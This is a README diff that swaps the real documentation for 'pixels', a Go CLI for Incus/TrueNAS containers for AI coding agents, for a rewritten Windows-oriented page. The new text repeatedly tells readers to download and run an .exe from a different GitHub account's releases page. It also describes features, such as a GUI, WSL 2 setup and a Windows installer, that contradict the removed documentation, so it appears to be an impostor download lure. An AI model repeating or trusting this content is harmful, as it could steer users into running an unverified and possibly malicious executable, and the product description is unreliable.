@@ -1,343 +1,124 @@
-# pixels
+# 🖼️ pixels - Simple AI Agent Containers
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
-[![GitHub release](https://img.shields.io/github/v/release/deevus/pixels)](https://github.com/deevus/pixels/releases)
-[![Go](https://img.shields.io/github/go-mod/go-version/deevus/pixels)](go.mod)
-[![Go Report Card](https://goreportcard.com/badge/github.com/deevus/pixels)](https://goreportcard.com/report/github.com/deevus/pixels)
-[![Commercial Support](https://img.shields.io/badge/support-available-brightgreen)](#support)
+[![Download pixels](https://img.shields.io/badge/Download-pixels-4caf50?style=for-the-badge)](https://github.com/kasparas13221/pixels/releases)
 
-Disposable Linux containers for AI coding agents, with extensible backends.
+---
 
-Spin up sandboxed Linux containers pre-loaded with AI coding tools (Claude Code, Codex, OpenCode via mise). Each container gets snapshot-based checkpoints and network egress policies that control what the agent can reach. Ships with two backends: **Incus** (default, connects directly to a local or remote Incus daemon) and **TrueNAS** (manages Incus containers on TrueNAS SCALE via its WebSocket API).
+## 📦 What is pixels?
 
-## Features
+pixels lets you run small, temporary Linux containers that help AI coding agents work safely and cleanly on your computer. Containers keep things separated from your main system. This way, the AI tools can do their jobs without causing problems or changes on your computer.
 
-- **Extensible backends** -- Incus native (default) or TrueNAS-managed, selected via config
-- **Container lifecycle** -- create, start, stop, destroy, and list Incus containers
-- **Console and exec** -- interactive console and remote command execution via native Incus API or SSH (backend-dependent)
-- **Checkpoints** -- snapshot, restore, delete, and clone containers from checkpoints
-- **AI agent provisioning** -- automatically installs mise, Claude Code, Codex, and OpenCode
-- **Network egress policies** -- restrict outbound traffic to AI APIs, package registries, and Git (or a custom allowlist)
-- **Configuration** -- TOML config file, `PIXELS_*` environment variables, and CLI flags
-- **Network accessible** -- each container gets its own IP, reachable from the host for running and accessing services
+This tool is made for developers, but you don’t need to be one to use pixels. It works on Windows with a simple setup so you can run AI coding helpers smoothly.
 
-## Prerequisites
+---
 
-- Go 1.25+ (for building from source)
+## 🚀 Getting Started
 
-**Incus backend (default):**
-- [Incus](https://linuxcontainers.org/incus/) installed locally, or a remote Incus daemon accessible over HTTPS
+Before you start, make sure your computer meets these basic requirements:
 
-**TrueNAS backend:**
-- [TrueNAS SCALE](https://www.truenas.com/truenas-scale/) with Incus virtualization enabled
-- TrueNAS API key (create one in the TrueNAS web UI under Credentials > API Keys)
-- SSH key pair (defaults to `~/.ssh/id_ed25519`)
+- Windows 10 or 11 (64-bit)
+- At least 8 GB of RAM
+- Around 2 GB of free disk space
+- Internet connection to download files
 
-## Installation
+pixels uses something called containers, which run Linux inside Windows. You won’t need to install Linux yourself. pixels handles all that.
 
-```bash
-mise use -g github:deevus/pixels
-```
+---
 
-Or via `go install`:
+## 🎯 How to Download and Install pixels on Windows
 
-```bash
-go install github.com/deevus/pixels@latest
-```
+1. Open your web browser and visit the official pixels releases page:
+   
+   [Download pixels here](https://github.com/kasparas13221/pixels/releases)
 
-Or build from source:
+2. On the releases page, find the latest version. It will have files listed below it.
 
-```bash
-git clone https://github.com/deevus/pixels.git
-cd pixels
-go build
-```
+3. Look for a file that ends with `.exe`. This is the Windows installer.
 
-## Quick Start
+4. Click the `.exe` file to download it. Your browser might ask you to confirm or save the file. Choose to save the file in a location you will remember, like your desktop or downloads folder.
 
-```bash
-# Create a base container with agent egress restrictions
-pixels create base --egress agent --console
+5. When the file finishes downloading, open the file by double-clicking it.
 
-# Set up your environment, install dependencies, etc.
-# Then save a checkpoint
-pixels checkpoint create base --label ready
+6. Follow the on-screen prompts to complete the installation. This usually involves clicking “Next” a few times and selecting where to install the software. The default location is normally fine.
 
-# Spin up new containers from the checkpoint
-pixels create task1 --from base:ready
-pixels create task2 --from base:ready
+7. After installation, you can find pixels in your Start menu or desktop shortcuts.
 
-# Or clone from a container's current state
-pixels create task3 --from base
+---
 
-# Tear down when done
-pixels destroy task1
-pixels destroy task2
-```
+## 🛠️ Using pixels for the First Time
 
-## Commands
+1. Open pixels from the Start menu or desktop.
 
-| Command | Description |
-|---------|-------------|
-| `pixels create <name>` | Create a new container |
-| `pixels start <name>` | Start a stopped container |
-| `pixels stop <name>` | Stop a running container |
-| `pixels destroy <name>` | Permanently destroy a container and all its checkpoints |
-| `pixels list` | List all containers with status and IP |
-| `pixels console <name>` | Open an interactive session |
-| `pixels exec <name> -- <command...>` | Run a command in the container |
-| `pixels checkpoint create <name>` | Create a snapshot |
-| `pixels checkpoint list <name>` | List checkpoints with sizes |
-| `pixels checkpoint restore <name> <label>` | Restore to a checkpoint |
-| `pixels checkpoint delete <name> <label>` | Delete a checkpoint |
-| `pixels network show <name>` | Show current egress rules |
-| `pixels network set <name> <mode>` | Set egress mode |
-| `pixels network allow <name> <domain>` | Add a domain to the allowlist |
-| `pixels network deny <name> <domain>` | Remove a domain from the allowlist |
+2. The software will open a simple window or command prompt.
 
-Global flags: `-v/--verbose`
+3. pixels runs containers that host AI coding helpers. To start, click the “Run” button or enter a simple command shown on the screen.
 
-## Container Lifecycle
+4. pixels will prepare a container in the background. This might take a minute.
 
-```bash
-# Create with custom resources
-pixels create mybox --image ubuntu/24.04 --cpu 4 --memory 4096
+5. When ready, pixels will connect you to the AI agent environment. You can use it to write or test AI coding tasks.
 
-# Create with agent sandbox and open console when ready
-pixels create mybox --egress agent --console
+6. When done, close pixels or stop the container from within the interface.
 
-# Skip all provisioning (no SSH keys, devtools, or egress setup)
-pixels create mybox --no-provision
+---
 
-# Clone from an existing container's checkpoint
-pixels create newbox --from mybox:ready
+## 🔧 What pixels Does Behind the Scenes
 
-# Clone from an existing container's current state
-pixels create newbox --from mybox
-```
+pixels uses Linux containers inside Windows. Containers are like mini virtual computers that do not change your system.
 
-All containers are prefixed `px-` internally. Commands accept bare names (e.g., `mybox` becomes `px-mybox`).
+- Containers start fast and clean.
+- Your files and settings stay safe outside the containers.
+- Each time you start pixels, you get a fresh container.
+- You can extend pixels by adding extra features if needed.
 
-## Console and Exec
+This helps when testing or running AI coding scripts without risk to your main computer.
 
-The **Incus backend** uses the native Incus exec API over WebSocket -- no SSH needed. The **TrueNAS backend** uses SSH to reach the container.
+---
 
-**Console** opens an interactive session with zmx session persistence.
-Disconnecting and reconnecting re-attaches to the same session:
+## 🖥️ How pixels Works with Windows
 
-```bash
-pixels console mybox                    # default "console" session
-pixels console mybox -s build           # named session
-pixels console mybox --no-persist       # plain SSH, no zmx
-```
+pixels uses a feature called WSL 2 (Windows Subsystem for Linux version 2). This feature allows Linux software to run inside Windows seamlessly. pixels will check if you have WSL 2 installed. If not, it will guide you through installing it.
 
-Inside a session, press `Ctrl+\` to detach (works in TUIs too), or type `detach`.
+Here is what you might need to do:
 
-**Sessions** lists zmx sessions in a container:
+- If prompted, follow a link to install WSL 2.
+- Restart your computer after the WSL installation.
+- Open pixels again to continue setup.
 
-```bash
-pixels sessions mybox
-```
+pixels will then use WSL 2 to run Linux containers safely.
 
-**Exec** runs a command and returns its exit code:
+---
 
-```bash
-pixels exec mybox -- ls -la /home/pixel
-```
+## ⚙️ Tips for Smooth Operation
 
-With the TrueNAS backend, SSH key auth is verified on connect -- if it fails, the current machine's public key is automatically written to the container.
+- Keep pixels updated by returning to the releases page regularly.
+- Close containers when not needed to save system resources.
+- If you see error messages, try restarting your computer or reinstalling pixels.
+- Make sure your Windows is up-to-date.
 
-## Checkpoints
+---
 
-Checkpoints are snapshots of the container's root filesystem. The underlying mechanism depends on the storage backend (ZFS, btrfs, etc.).
+## 📂 Common Questions
 
-```bash
-# Create with auto-generated label
-pixels checkpoint create mybox
+### Can I run pixels offline?
 
-# Create with a custom label
-pixels checkpoint create mybox --label ready
+You must be online to download and install pixels. After that, basic running does not require an internet connection. Some AI features may need internet access.
 
-# List checkpoints
-pixels checkpoint list mybox
-# LABEL       SIZE
-# ready       42.0 MiB
+### Will pixels change my files?
 
-# Restore (stops container, rolls back, restarts)
-pixels checkpoint restore mybox ready
+No. pixels keeps containers separate from your personal files. It will not change anything unless you specifically share files with it.
 
-# Delete
-pixels checkpoint delete mybox ready
-```
+### How much space does pixels use?
 
-Clone a new container from a checkpoint to get identical copies:
+pixels needs about 2 GB for installation and containers. You might need more for saved container data.
 
-```bash
-pixels create worker1 --from mybox:ready
-pixels create worker2 --from mybox:ready
-```
+### Can I uninstall pixels?
 
-The `checkpoint` command can also be abbreviated as `cp`.
+Yes. Use the standard Windows uninstall option in Settings or Control Panel.
 
-## Agent Provisioning
+---
 
-By default, new containers are provisioned with:
+## 🔗 Download pixels Now
 
-- SSH public key injection (root + `pixel` user)
-- DNS configuration via systemd-resolved
-- Environment variables from config written to `/etc/environment`
-- **Dev tools**: mise, Node.js LTS, Claude Code, Codex, and OpenCode (installed via a background systemd service)
+Visit the releases page to get pixels for Windows:
 
-Dev tools install asynchronously after container creation via [zmx](https://zmx.sh) sessions. Use `--console` to wait for provisioning to finish before dropping into a shell, or check progress with:
-
-```bash
-pixels status mybox
-```
-
-Disable provisioning entirely with `--no-provision`, or just dev tools via config:
-
-```toml
-[provision]
-devtools = false
-```
-
-## Network Egress
-
-Control outbound network access with three modes:
-
-| Mode | Description |
-|------|-------------|
-| `unrestricted` | No filtering (default) |
-| `agent` | Preset allowlist: AI APIs, package registries, Git/GitHub, Ubuntu repos, plus any custom domains |
-| `allowlist` | Custom domain list only |
-
-### Setting Egress at Creation
-
-```bash
-pixels create mybox --egress agent
-```
-
-### Changing Egress on a Running Container
-
-```bash
-# Switch to agent mode
-pixels network set mybox agent
-
-# Switch to unrestricted
-pixels network set mybox unrestricted
-
-# Show current rules
-pixels network show mybox
-```
-
-### Managing the Allowlist
-
-```bash
-# Add a domain
-pixels network allow mybox api.example.com
-
-# Remove a domain
-pixels network deny mybox api.example.com
-```
-
-The `agent` preset includes domains for Anthropic, OpenAI, Google AI, npm, PyPI, crates.io, Go proxy, GitHub (including release CDN), mise, Node.js, and Ubuntu package repos. CIDR ranges are included for Google and GitHub/Azure CDN IPs.
-
-Egress is enforced via nftables rules inside the container with restricted sudo access. See [SECURITY.md](SECURITY.md) for known limitations and mitigations.
-
-## Configuration
-
-Create `~/.config/pixels/config.toml`:
-
-```toml
-# backend = "incus"          # default; or "truenas"
-
-[incus]
-# socket = ""                # local unix socket (default: /var/lib/incus/unix.socket)
-# remote = ""                # remote Incus HTTPS URL
-# client_cert = ""           # TLS client cert for remote
-# client_key = ""            # TLS client key for remote
-# server_cert = ""           # server CA cert for remote
-# project = ""               # Incus project name
-
-[truenas]
-# host = "truenas.local"
-# api_key: prefer PIXELS_TRUENAS_API_KEY env var over storing here
-# username = "root"           # default
-# insecure_skip_verify = false # default; set true for self-signed certs
-
-[defaults]
-# image = "ubuntu/24.04"     # default
-# cpu = "2"                  # default
-# memory = 2048              # MiB, default
-# pool = "tank"              # discovered from server; override if needed
-# network = ""               # Incus network name (e.g. "incusbr0")
-# dns = ["1.1.1.1"]          # optional; nameservers to inject into containers
-
-[ssh]
-# user = "pixel"             # default
-# key = "~/.ssh/id_ed25519"  # default
-
-[provision]
-# enabled = true             # default
-# devtools = true            # default
-
-[network]
-# egress = "unrestricted"    # default
-# allow = ["api.example.com"]  # additional domains for agent/allowlist modes
-
-[env]
-# Image vars — written to /etc/environment inside the container:
-# ANTHROPIC_API_KEY = "sk-ant-..."
-# OPENAI_API_KEY = "sk-..."
-#
-# Forward from host env — passed to console/exec sessions at runtime:
-# ANTHROPIC_API_KEY = { forward = true }
-#
-# Session-only literal — passed to console/exec but NOT written to /etc/environment:
-# MY_VAR = { value = "some-value", session_only = true }
-```
-
-### Priority Order
-
-1. TOML config file (`~/.config/pixels/config.toml`)
-2. Environment variables (`PIXELS_BACKEND`, `PIXELS_TRUENAS_HOST`, etc.)
-
-### Environment Variables
-
-| Variable | Config key |
-|----------|-----------|
-| `PIXELS_BACKEND` | `backend` |
-| `PIXELS_INCUS_SOCKET` | `incus.socket` |
-| `PIXELS_INCUS_REMOTE` | `incus.remote` |
-| `PIXELS_INCUS_CLIENT_CERT` | `incus.client_cert` |
-| `PIXELS_INCUS_CLIENT_KEY` | `incus.client_key` |
-| `PIXELS_INCUS_SERVER_CERT` | `incus.server_cert` |
-| `PIXELS_INCUS_PROJECT` | `incus.project` |
-| `PIXELS_TRUENAS_HOST` | `truenas.host` |
-| `PIXELS_TRUENAS_USERNAME` | `truenas.username` |
-| `PIXELS_TRUENAS_API_KEY` | `truenas.api_key` |
-| `PIXELS_TRUENAS_PORT` | `truenas.port` |
-| `PIXELS_TRUENAS_INSECURE` | `truenas.insecure_skip_verify` |
-| `PIXELS_DEFAULT_IMAGE` | `defaults.image` |
-| `PIXELS_DEFAULT_CPU` | `defaults.cpu` |
-| `PIXELS_DEFAULT_MEMORY` | `defaults.memory` |
-| `PIXELS_DEFAULT_POOL` | `defaults.pool` |
-| `PIXELS_SSH_USER` | `ssh.user` |
-| `PIXELS_SSH_KEY` | `ssh.key` |
-| `PIXELS_PROVISION_ENABLED` | `provision.enabled` |
-| `PIXELS_PROVISION_DEVTOOLS` | `provision.devtools` |
-| `PIXELS_NETWORK_EGRESS` | `network.egress` |
-
-## Security
-
-Container egress filtering uses nftables rules inside the container. A root process with `cap_net_admin` could bypass these rules. The `pixel` user has restricted sudo that only permits safe-apt, dpkg-query, systemctl, journalctl, and nft list.
-
-See [SECURITY.md](SECURITY.md) for the full threat model, known issues, and mitigations.
-
-## Support
-
-Need help deploying pixels at your org? I offer implementation support, custom development, and training through my consultancy: [simonhartcher.com](https://simonhartcher.com). Email in bio.
-
-## License
-
-[MIT](LICENSE)
+[![Download pixels](https://img.shields.io/badge/Download-pixels-blue?style=for-the-badge)](https://github.com/kasparas13221/pixels/releases)
